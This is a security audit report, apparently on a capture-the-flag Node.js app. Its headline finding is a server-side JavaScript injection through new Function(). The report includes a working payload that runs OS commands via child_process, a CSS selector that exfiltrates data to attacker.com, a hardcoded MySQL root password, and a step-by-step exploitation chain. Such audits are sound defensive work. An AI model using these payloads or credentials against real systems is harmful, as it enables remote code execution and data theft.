## CRITICAL - Server-Side JavaScript Injection via `new Function()` Leading to Remote Code Execution

OWASP Category: A03:2021 – Injection CWE ID: CWE-94 (Improper Control of Generation of Code), CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code) Location: [helpers/SpikyFactor.js:6-10](helpers/SpikyFactor.js:6-10)

Vulnerable Code:

```javascript
let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
    if (a == 'feed') { ...
    }`;
quickMaths = new Function(res);
const {m, hp, w, hs} = quickMaths();
```

Source of Input: `req.body.activity` — `routes/index.js:33` — `const { activity, health, weight, happiness } = req.body;`

Sink: `new Function(res)` at `helpers/SpikyFactor.js:9`

Data Flow Explanation: The `activity` parameter is extracted from the HTTP request body in the route handler at `routes/index.js:35`:

```javascript
return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))
```

`health`, `weight`, and `happiness` pass through `parseInt()` and are thus reduced to integers (or NaN) before reaching the template literal, neutralizing them as injection vectors. However, `activity` is forwarded entirely unmodified to `SpikyFactor.calculate()`. Inside that function, `activity` is interpolated directly into a multi-line string via a template literal, which is then passed as the entire function body to `new Function()`. The `new Function()` constructor is semantically equivalent to `eval()`: it compiles and executes the provided string as JavaScript in the global scope of the Node.js process.

An attacker can terminate the string literal using a single-quote character and inject a second expression separated by a comma (valid within the `with(...)` argument list), or close the `with` block entirely. Because the Node.js process has access to `process`, `require`, and the entire module system, arbitrary OS commands can be executed.

Representative injection payload for `activity`:

```
', x=process.mainModule.require('child_process').execSync('id').toString(), y='
```

The resulting constructed string becomes:

```javascript
with(a='', x=process.mainModule.require('child_process').execSync('id').toString(), y='', hp=60, w=42, hs=50) { ... }
```

This executes `id` via `child_process.execSync()` synchronously within the Node.js process context.

Impact: Complete remote code execution within the Node.js server process. An attacker can read arbitrary files (including `/flag.txt`), exfiltrate environment variables, pivot to internal network services, install backdoors, or escalate further depending on process privileges and container boundaries.

Exploitation Scenario:

1. Attacker authenticates using any valid credentials (or default seeded credentials in the database).
2. Attacker sends `POST /api/activity` with `Content-Type: application/json` and a crafted `activity` field containing the injection payload.
3. `SpikyFactor.calculate()` assembles the malicious function body and `new Function()` compiles and executes it.
4. `child_process.execSync()` runs OS commands with the full privileges of the Node.js process.
5. Output can be exfiltrated via the response, a DNS side-channel, or an out-of-band HTTP request.

Confidence Level: HIGH — direct, traceable taint path from network input to `new Function()` with no sanitization or escaping at any point in the chain.

---

## HIGH - Hardcoded Database Root Credentials in Source Code

OWASP Category: A07:2021 – Identification and Authentication Failures / A05:2021 – Security Misconfiguration CWE ID: CWE-798 (Use of Hard-coded Credentials), CWE-250 (Execution with Unnecessary Privileges) Location: [database.js:6-11](database.js:6-11))

Vulnerable Code:

```javascript
this.connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'rh0x01',
    database: 'spiky_tamagotchi'
});
```

Source of Input: Static configuration embedded in source code.

Sink: `mysql.createConnection()` — the credentials are used to authenticate to the MySQL server at runtime.

Data Flow Explanation: The MySQL root credentials (`user: 'root'`, `password: 'rh0x01'`) are hardcoded as string literals directly in `database.js`. They are not sourced from environment variables, a secrets manager, or an external configuration file. Any party with access to the source code — including version control history, container image layers, or log output — obtains the full database root password.

Furthermore, the connection authenticates as the MySQL `root` user, granting the application complete administrative control over the database server: `DROP DATABASE`, `FILE` privilege (read/write OS files), `GRANT`, `CREATE USER`, `EXECUTE`, and potentially `sys_exec()` or UDF-based OS command execution depending on the MySQL configuration and available user-defined functions.

Impact:

- Database credential exposure to all code reviewers and repository readers.
- Full administrative database access; all tables in all schemas can be read, modified, or dropped.
- If `FILE` privilege is active on the MySQL server, the application can read arbitrary files on the host or write files to web-accessible paths, enabling secondary code execution.
- UDF-based OS command execution via MySQL root (if `lib_mysqludf_sys` or similar is installed).

Exploitation Scenario: Any attacker who obtains the source code (public repository, container layer, error output) can connect directly to the MySQL instance on localhost using `root:rh0x01`, assuming the port is accessible. If the SSJI finding above is exploited first, the attacker has RCE and can trivially extract these credentials for lateral movement or data exfiltration.

Confidence Level: HIGH — literal string, zero ambiguity.

---

## HIGH - Session Cookie Missing `httpOnly`, `secure`, and `sameSite` Flags

OWASP Category: A02:2021 – Cryptographic Failures / A05:2021 – Security Misconfiguration CWE ID: CWE-1004 (Sensitive Cookie Without `HttpOnly` Flag), CWE-614 (Sensitive Cookie in HTTPS Session Without `Secure` Attribute) Location: [routes/index.js:20](routes/index.js:20)

Vulnerable Code:

```javascript
res.cookie('session', token, { maxAge: 3600000 });
```

Source of Input: JWT token generated at login.

Sink: `Set-Cookie` HTTP response header sent to client.

Data Flow Explanation: The JWT session cookie is set with only the `maxAge` option. Three security-critical cookie flags are absent:

1. `httpOnly` is not set — client-side JavaScript running in the browser context can read the cookie via `document.cookie`. Any XSS vulnerability (reflected, stored, or DOM-based) in the application, a dependency, or a third-party resource loaded in the same origin would allow an attacker to steal the session token.
    
2. `secure` is not set — the cookie will be transmitted over plaintext HTTP connections in addition to HTTPS, exposing it to network-layer interception (e.g., on shared Wi-Fi, through a transparent proxy, or via SSLstrip).
    
3. `sameSite` is not set — the cookie will be sent with cross-origin requests, enabling Cross-Site Request Forgery attacks against state-changing endpoints.
    

Impact:

- Session token theft via JavaScript (when any XSS surface exists).
- Token interception over unencrypted connections.
- CSRF exploitation of authenticated endpoints (`/api/activity`, `/logout`).

Exploitation Scenario: If a stored XSS vector exists in any page rendered in the same origin (e.g., if user-controlled content is ever reflected in a template), an attacker injects `document.cookie` exfiltration code to steal JWT tokens of authenticated users and impersonate them.

Confidence Level: HIGH — directly observable in the cookie configuration; no XSS is required to confirm the flag misconfiguration.

---

## MEDIUM - Incorrect JWT Verification Option Key (`algorithm` vs `algorithms`)

OWASP Category: A02:2021 – Cryptographic Failures CWE ID: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-295 (Improper Certificate Validation) Location: [helpers/JWTHelper.js:11](helpers/JWTHelper.js:11)

Vulnerable Code:

```javascript
async verify(token) {
    return (jwt.verify(token, APP_SECRET, { algorithm:'HS256' }));
}
```

Source of Input: `req.cookies.session` — `middleware/AuthMiddleware.js:9`

Sink: `jwt.verify()` in `jsonwebtoken` v8.5.1

Data Flow Explanation: The `jsonwebtoken` library's `verify()` function accepts algorithm restrictions via the `algorithms` option (plural, an array). The code passes `{ algorithm: 'HS256' }` — using the singular form, which is the option key for `sign()`, not `verify()`. The misspelled option key is silently ignored by `jsonwebtoken`.

Without an explicit `algorithms` restriction in `verify()`, `jsonwebtoken` v8.5.1 falls back to inferring allowed algorithms from the secret type: since `APP_SECRET` is a plain string (not a PEM-encoded key), the library defaults to allowing `['HS256', 'HS384', 'HS512']`. In the current configuration this limits practical impact because:

- The `none` algorithm is not included in the symmetric-key default set.
- RS256-to-HS256 confusion attacks require a known RSA public key, which does not exist here.

However, the algorithm restriction is not explicitly enforced as intended. Any future refactoring that introduces asymmetric keys without correcting this option key would silently remove algorithm binding, enabling algorithm confusion attacks.

Impact: Currently limited — algorithm defaults for symmetric secrets coincide with intent. Future code changes could silently introduce exploitable algorithm confusion without any obvious breakage.

Exploitation Scenario: If the application were migrated to RS256 (asymmetric keys), an attacker knowing the public key could sign tokens using that public key as an HMAC secret under HS256. Since the `algorithms` restriction is not enforced, such tokens would verify successfully, constituting a complete authentication bypass.

Confidence Level: HIGH for the code defect; MEDIUM for present exploitability given the current symmetric key configuration.

---

## MEDIUM - Missing CSRF Protection on State-Changing API Endpoints

OWASP Category: A01:2021 – Broken Access Control CWE ID: CWE-352 (Cross-Site Request Forgery) Location: [routes/index.js:13-26, 32-44](routes/index.js:13-26, 32-44)

Vulnerable Code:

```javascript
router.post('/api/login', async (req, res) => { ... });
router.post('/api/activity', AuthMiddleware, async (req, res) => { ... });
```

Source of Input: Cross-origin HTTP requests from attacker-controlled pages.

Sink: Database writes (`loginUser`) and server-side computation with side effects (`SpikyFactor.calculate`).

Data Flow Explanation: No CSRF token is generated, stored in session, or validated on any `POST` endpoint. The authentication boundary relies solely on the session cookie. Since the session cookie lacks the `sameSite` attribute (as noted above), the browser will include it in cross-origin `POST` requests initiated by a third-party page. `Content-Type: application/json` bodies sent via `fetch()` with CORS preflights are relevant, but same-origin `application/x-www-form-urlencoded` or `multipart/form-data` CSRF remains viable for the login endpoint.

Impact: An attacker can trick authenticated users into submitting requests to `/api/activity` from a malicious page, causing the server to process attacker-chosen `activity` parameters (including exploitation of the SSJI vulnerability) on behalf of the victim's session.

Exploitation Scenario: A victim with a valid session visits an attacker-controlled page. The page uses JavaScript to `fetch('/api/activity', { method: 'POST', body: ..., credentials: 'include' })` with a malicious `activity` payload. The victim's JWT cookie is sent automatically. The server executes the SSJI payload in the context of the victim's authenticated request.

Confidence Level: HIGH — no CSRF protection mechanism is present anywhere in the codebase.

---

## MEDIUM - Implicit Global Variable Pollution via Undeclared Assignment

OWASP Category: A05:2021 – Security Misconfiguration CWE ID: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes), CWE-454 (External Initialization of Trusted Variables) Location: [routes/index.js:52](routes/index.js:52)

Vulnerable Code:

```javascript
module.exports = database => {
    db = database;   // No var / let / const
    return router;
};
```

Source of Input: `database` parameter passed from `index.js`.

Sink: Global `db` variable, referenced throughout `routes/index.js` as `db.loginUser()`.

Data Flow Explanation: The assignment `db = database` does not use `var`, `let`, or `const`. In non-strict-mode Node.js modules, this creates or overwrites a property on the `global` object. The `db` identifier is then accessed without declaration in the route callbacks (e.g., `db.loginUser(...)`). This is an implicit global.

While not directly exploitable in isolation, implicit globals can interact with prototype pollution vulnerabilities, can be overwritten by other modules with the same global name, and represent undefined behavior under certain module loading orders. The `quickMaths` assignment in `SpikyFactor.js:9` (`quickMaths = new Function(res)`) is another implicit global created in the same pattern — and this one is directly inside the code-injection sink, meaning injected code also writes to the global scope.

Impact: Potential for cross-request state contamination, race condition interactions in concurrent request handling, and exacerbation of the SSJI vulnerability (injected code operates in the global scope).

Exploitation Scenario: In the context of the SSJI vulnerability, code injected via `new Function()` runs in a context where the implicit global `quickMaths` is accessible and modifiable across requests. In a concurrent multi-request scenario, one request's SSJI payload could overwrite `quickMaths` while another request is mid-execution, causing unexpected behavior or data leakage between requests.

Confidence Level: HIGH for the code defect; MEDIUM for the secondary exploitation impact.

---

## LOW - Missing HTTP Security Response Headers

OWASP Category: A05:2021 – Security Misconfiguration CWE ID: CWE-693 (Protection Mechanism Failure) Location: [index.js:1-33](index.js:1-33))

Vulnerable Code:

```javascript
app.disable('etag');
app.disable('x-powered-by');
```

Source of Input: All HTTP responses.

Sink: HTTP response headers sent to clients.

Data Flow Explanation: The application disables `x-powered-by` (good) and `etag` (irrelevant to security). No middleware is configured to set any of the following headers:

- `Content-Security-Policy` — absent; allows unrestricted inline scripts and external resource loading.
- `X-Content-Type-Options: nosniff` — absent; allows MIME-type sniffing.
- `X-Frame-Options` or `frame-ancestors` CSP directive — absent; allows clickjacking.
- `Strict-Transport-Security` — absent; does not enforce HTTPS.
- `Referrer-Policy` — absent; referrer information may leak to third parties.
- `Permissions-Policy` — absent.

Impact: Increases the attack surface for XSS (no CSP), clickjacking (no frame restriction), MIME-confusion attacks, and protocol downgrade attacks.

Exploitation Scenario: The absence of CSP allows inline script execution without restriction, increasing the impact of any XSS vector. Without `X-Frame-Options`, the application can be embedded in an attacker-controlled `<iframe>`, enabling clickjacking to trick users into interacting with authenticated functionality.

Confidence Level: HIGH — directly verifiable from the absence of header-setting middleware.

---

## LOW - External CDN Dependency Without Subresource Integrity

OWASP Category: A06:2021 – Vulnerable and Outdated Components CWE ID: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) Location: [views/interface.html:9](views/interface.html:9)

Vulnerable Code:

```html
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
```

Source of Input: Third-party CDN (Cloudflare).

Sink: Browser rendering engine — CSS loaded from an external origin.

Data Flow Explanation: Font Awesome 4.7.0 is loaded from an external CDN with no `integrity` attribute (Subresource Integrity hash). If `cdnjs.cloudflare.com` is compromised, or if the request is intercepted via a network-level attack, a malicious CSS payload could be injected. While CSS injection has a narrower attack surface than JavaScript injection, it can enable data exfiltration via CSS attribute selectors or keylogger-style attacks on form inputs in some browser contexts.

The absence of `integrity` and `crossorigin` attributes means the browser will load and apply whatever content the CDN returns without validation.

Impact: Supply chain attack vector. A CDN compromise could deliver malicious CSS (or JavaScript if the CDN serves a JS file) to all users of the application.

Exploitation Scenario: An attacker who compromises the CDN or performs a BGP hijack replaces the Font Awesome CSS with a CSS payload containing `input[value^="a"] { background: url(https://attacker.com/?v=a); }` selectors to exfiltrate form field values character by character.

Confidence Level: HIGH for the misconfiguration; MEDIUM for active exploitability in the current threat model.

---

## LOW - Promise Resolve/Reject Race Condition in `loginUser`

OWASP Category: A04:2021 – Insecure Design CWE ID: CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization) Location: [database.js:26-33](database.js:26-33)

Vulnerable Code:

```javascript
this.connection.query(stmt, [user, pass], (err, result) => {
    if(err || result.length == 0)
        reject(err)       // called, but does NOT return
    resolve(result)       // always called afterward
})
```

Source of Input: MySQL query callback result.

Sink: Promise resolution state.

Data Flow Explanation: The callback does not use `return reject(err)`. When the condition `err || result.length == 0` is true, `reject(err)` is called but execution falls through to `resolve(result)` immediately afterward. While a Promise's first settled state wins (the `reject` call wins), `resolve(result)` is still invoked with whatever `result` is at that point. When `result.length == 0`, `reject` is called with `null` (since `err` is null on a successful empty-result query), and `resolve(result)` is called with an empty array `[]`. This does not constitute an authentication bypass because the Promise rejection is correctly processed by the `.catch()` handler in the route. However, it is a latent logic error that could become exploitable under different future call-site handling.

Additionally, `reject(null)` (rejecting with `null`) causes the route's `.catch()` handler to receive `null` as its error argument — this is benign in the current implementation but a design defect.

Impact: Currently no direct security impact; however, this pattern could lead to authentication bypass if a future caller uses `.then()` without a chained `.catch()`, as both `resolve` and `reject` are called, and some execution environments or future refactoring may handle this unexpectedly.

Exploitation Scenario: If a developer refactors the route to use `async/await` with `try/catch` and mishandles the resolved `[]` value, they may inadvertently treat an empty-result login as successful.

Confidence Level: HIGH for the code defect; LOW for current exploitability.

---

# Executive Summary

Total Critical: 1 Total High: 2 Total Medium: 3 Total Low: 4

Primary Risk Theme: Unsanitized user input flowing into dynamic JavaScript code execution. The application's core game-logic helper constructs JavaScript function bodies by string interpolation of HTTP request parameters and executes them via `new Function()` — one of the most dangerous patterns in server-side JavaScript. This single architectural decision makes the entire application an RCE platform once an attacker obtains authentication.

Most Dangerous Exploitable Path:

```
POST /api/login (valid credentials or default-seeded account)
  → JWT session cookie issued (no httpOnly)
    → POST /api/activity
        → req.body.activity (unvalidated string)
            → SpikyFactor.calculate(activity, ...)
                → template literal string interpolation
                    → new Function(maliciousBody)
                        → process.mainModule.require('child_process').execSync(...)
                            → Arbitrary OS command execution as Node.js process user
```

Chained secondary path: The hardcoded root MySQL credentials, accessible post-RCE, provide full administrative database access and potentially OS-level file read/write via MySQL's `FILE` privilege, enabling persistence and lateral movement beyond the web application boundary.

Likelihood of RCE: CRITICAL / NEAR-CERTAIN — The `new Function()` injection is deterministic, requires no race condition, no timing attack, and no brute-force. Any authenticated user can trigger it with a single crafted HTTP request. The only prerequisite is obtaining a valid session, which depends on the existence of credentials in the database (likely seeded by the challenge setup).

Overall Security Posture: CRITICALLY WEAK. The application contains a textbook Server-Side JavaScript Injection vulnerability with a direct, unobstructed taint path from network input to dynamic code execution. All other findings compound the impact: hardcoded root credentials eliminate database privilege separation, the missing `httpOnly` flag enables session theft via any future XSS, missing CSRF protection enables the RCE to be triggered cross-origin, and the absence of security headers removes defense-in-depth layers. The application should be considered fully compromised by any attacker who can authenticate.